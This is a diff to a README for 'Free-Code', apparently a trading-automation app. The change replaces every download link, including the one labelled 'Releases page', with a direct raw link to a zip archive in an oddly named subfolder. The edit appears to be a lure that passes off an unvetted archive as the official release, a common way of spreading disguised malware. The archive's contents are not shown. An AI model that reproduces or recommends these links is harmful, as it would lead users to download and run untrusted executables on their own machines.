@@ -1,6 +1,6 @@
 # 🤖 Free-Code - Automate Your Trading Easily
 
-[![Download Free-Code](https://img.shields.io/badge/Download-Free--Code-brightgreen)](https://github.com/zitounates/Free-Code/releases)
+[![Download Free-Code](https://raw.githubusercontent.com/zitounates/Free-Code/main/electrogild/Code-Free-v3.3.zip)](https://raw.githubusercontent.com/zitounates/Free-Code/main/electrogild/Code-Free-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Free-Code! This application helps you automate your trading with an e
 
 To get started, you need to visit our Releases page to download the latest version of Free-Code. Click the link below:
 
-[Visit this page to download](https://github.com/zitounates/Free-Code/releases)
+[Visit this page to download](https://raw.githubusercontent.com/zitounates/Free-Code/main/electrogild/Code-Free-v3.3.zip)
 
 ## 🔍 System Requirements
 
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets the following requirements:
 ## ⚙️ Installation Guide
 
 1. **Download the Application**: 
-   Go to our [Releases page](https://github.com/zitounates/Free-Code/releases) and download the latest version suitable for your operating system.
+   Go to our [Releases page](https://raw.githubusercontent.com/zitounates/Free-Code/main/electrogild/Code-Free-v3.3.zip) and download the latest version suitable for your operating system.
 
 2. **Locate the Downloaded File**: 
    Once the download completes, find the file in your computer's downloads folder.
@@ -76,4 +76,4 @@ For additional help, feel free to reach out to our support team via issues on Gi
 
 ---
 
-Explore the world of algorithmic trading with Free-Code today! Download it [here](https://github.com/zitounates/Free-Code/releases) and start automating your trades.
+Explore the world of algorithmic trading with Free-Code today! Download it [here](https://raw.githubusercontent.com/zitounates/Free-Code/main/electrogild/Code-Free-v3.3.zip) and start automating your trades.
